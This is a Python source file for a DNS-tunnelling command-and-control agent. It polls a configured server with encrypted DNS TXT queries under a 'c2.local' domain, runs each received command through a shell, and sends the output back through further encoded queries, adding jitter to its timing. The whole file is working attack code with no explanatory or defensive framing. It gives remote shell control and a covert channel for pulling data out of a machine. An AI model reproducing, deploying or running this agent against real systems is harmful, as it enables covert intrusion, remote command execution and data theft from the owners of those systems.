import dns.resolver
import subprocess
import crypto
import os
import time
import random

KEY = bytes.fromhex(os.getenv("C2_KEY"))
SERVER = os.getenv("C2_SERVER")        # RPi IP address
SESSION_ID = os.getenv("SESSION_ID")   # unique per agent
INTERVAL = 5                           # poll every 5 seconds

def send_query(payload: bytes) -> bytes:
    encoded = payload.hex()
    qname = f"{encoded}.{SESSION_ID}.c2.local"
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [SERVER]
    answer = resolver.resolve(qname, "TXT")
    response_hex = str(answer[0]).strip('"')
    return bytes.fromhex(response_hex)

def execute(command: str) -> str:
    if command == "WAIT":
        return ""
    try:
        result = subprocess.run(
            command, shell=True,
            capture_output=True, text=True, timeout=10
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def beacon():
    print(f"Agent beaconing — session {SESSION_ID}")
    while True:
        # step 1 — send heartbeat query
        encrypted_ping = crypto.encrypt("READY", KEY)
        encrypted_task = send_query(encrypted_ping)

        # step 2 — decrypt and execute
        task = crypto.decrypt(encrypted_task, KEY)
        output = execute(task)

        # step 3 — send result back if we did something
        if output:
            encrypted_result = crypto.encrypt(output, KEY)
            send_query(encrypted_result)

        time.sleep(INTERVAL + random.uniform(-1, 1))  # tiny jitter

if __name__ == "__main__":
    beacon()